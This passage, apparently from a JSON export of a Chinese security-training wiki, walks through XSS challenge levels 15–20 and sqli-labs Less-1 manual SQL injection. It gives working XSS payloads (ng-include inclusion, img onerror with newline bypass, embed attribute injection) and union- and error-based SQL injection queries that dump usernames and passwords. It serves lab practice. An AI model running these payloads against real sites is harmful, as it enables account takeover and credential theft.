记录着照片的属性信息和拍摄数据，可以更改图片的参数把一张恶意的图片传到可执行该信息的网站 level 15 查看页面源码，最底部有一行 span 标签，class 属性是ng-include &lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt; 查询了一下得知是前端框架 angular js 里面的，含义是文件包含 于是可以把本地文件level1.php包含起来让其执行 XSS ?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;' level 16 用&lt;script&gt;alert('xss')&lt;/script&gt;测试，查看页面源代码，发现参数值在 center 标签中，而用于构造 XSS 的script、/、空格被替换为了&amp;nbsp; /被编码这意味着像是&lt;&gt;&lt;/&gt;需要闭合的标签用不了，所以想到了&lt;img&gt;这种自闭和的标签 换行符 --URL编码后--&gt; %0a // 直接输入发现“空格”被替换为了 &amp;nbsp; 因此考虑用 %0a 即换行符绕过空格 &lt;img src=”1” onerror=alert(‘xss’)&gt; &lt;img%0asrc=1%0aonerror=alert(1)&gt; &lt;img src=”1” onerror=alert(‘xss’) &gt; URL 解码 插入 XSS level 17 在 URL 中填上参数?arg01=1111&amp;arg02=2222，然后查看页面源代码，发现有个 embed 标签，填入的参数在 src 属性中进行了拼接 &lt;embed&gt;标签就是引入一个swf文件【SWF格式是动画软件Flash的专用格式】 &lt;!-- 查看页面源代码 --&gt; &lt;embed src=xsf01.swf?1111=2222 width=100% heigth=100%&gt;&lt;h2 align=center&gt; ?arg01= onclick&amp;arg02=alert(‘xss’) // ' &gt; onmouseover=alert(1) 火狐、Chrom、Edge 等浏览器已不支持 flash，所以不会弹窗 level 18 和 level 17 是一样的 level 19、20 IE 浏览器和 flash 均已被历史淘汰","tags":[null],"categories":[null]},{"title":"sqli-labs 靶场（手工注入）","path":"/wiki/XSS-and-Security-Labs/sqli-labs.html","content":"前言 参考： SQLI labs 靶场精简学习记录 https://github.com/Audi-1/sqli-labs 工具方面可用老版本的 Hackerbar，以及抓包工具 Burpsuite Less-1 可先查看数据库的记录次数 一直增大 id 的值，当 id 的值大于 14，得到的是一个没有用户名和密码的空白页面，这意味着数据库只有 14 条记录 ?id=1 …… ?id=14 但是我们并不知道开发者具体是怎样封装 id 参数值的。所以得先找封装形式 使用基于错误返回的 SQL 注入，单引号'或者转义符\\ 通过转义字符来找出 参数封装形式，在MYSQL中 ''(反斜杠)被用来转义一个字符。转义一个字符意味着取消该字符的特殊用途。使用转义字符可以得到更清楚的图片。 ?id=1' ?id=1\\ less-1 到 less-4 的封装形式 破坏查询的同时，用--+修复它的语法错误，-- 是 SQL 的注释语句 输入 1'--+ 或者输入 1'--%20（%20 URL编码为空格） 或者输入 1'%23 （%23 URL编码为 # ） SELECT * from table_name WHERE id='1'--+' LIMIT 0,1 使用联合查询 接下来在引号和 --+ 之间添加查询来获取数据库中的信息 通过order by 1来查询有几列，之所以需要知道数据库有几列是因为联合查询 union 规定的，得知总共有 3 列 ?id=1' order by 1 --+ --&gt; 返回正确 ?id=1' order by 4 --+ --&gt; 返回错误 -- UNION，没有错误 ?id=1' union select 1,2,3 --+ SELECT * from table_name WHERE ?id='1' union select 1,2,3 --+' 但是我们得到的是第一个查询的结果集，为了将第二个查询的结果显示在屏幕上，我们必须将第一条查询的结果集置为EMPTY。这点可通过给定 id 一个不存在的值来实现。我们可以将 id 的值设为负或者大于14，因为前面已经发现了数据库中只有14条记录。 union ?id=-1' union select 1,2,3 --+ 或者 ?id=15' union select 1,2,3 --+ SELECT * from table_name WHERE ?id='-1' union select 1,2,3 --+' 数据库的版本信息 -- 数据库的版本信息 ?id=-1' union select 1,2,version() --+ -- 正在使用的数据库信息和当前后端所使用的数据库的版本信息 ?id=-1' union select 1,database(),version() --+ 基于错误返回的SQL查询 基于联合查询的SQL注入 为了让联合注入工作，首先要知道数据库中的表名，键入 id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ -- 拆解 id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ Your Login name:emails,referers,uagents,users Your Password:3 注入 联合查询 ?id=-1'+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ ?id=-1'+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ 报错注入 ?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ ?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ — 未完待续","tags":[null],"categories":[null]}]